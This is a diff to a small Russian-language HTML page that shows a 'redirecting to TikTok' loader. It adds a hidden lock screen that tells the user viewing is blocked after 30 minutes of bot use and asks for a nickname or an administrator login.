@@ -7,7 +7,7 @@
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <div class="container">
+    <div class="container" id="main-container">
         <h1>Подождите, идет переход на TikTok...</h1>
         <div class="loading">Loading...</div>
         <img src="https://cdn-icons-png.flaticon.com/128/4461/4461744.png" alt="Loading Icon" class="icon">
@@ -17,6 +17,15 @@
             <a href="https://instagram.com" target="_blank">Instagram</a>
         </div>
     </div>
+
+    <div class="lock-screen" id="lock-screen" style="display: none;">
+        <img src="https://cdn-icons-png.flaticon.com/128/481/481195.png" alt="Lock Icon" class="lock-icon">
+        <p class="lock-text">Просмотр заблокирован. Вы не можете продолжить просмотр, так как пользовались ботом 30 минут.</p>
+        <input type="text" id="nickname" placeholder="Введите ваш ник">
+        <button id="submit-nickname">Отправить</button>
+        <button id="admin-button">Я администратор</button>
+    </div>
+
     <script src="script.js"></script>
 </body>
 </html>
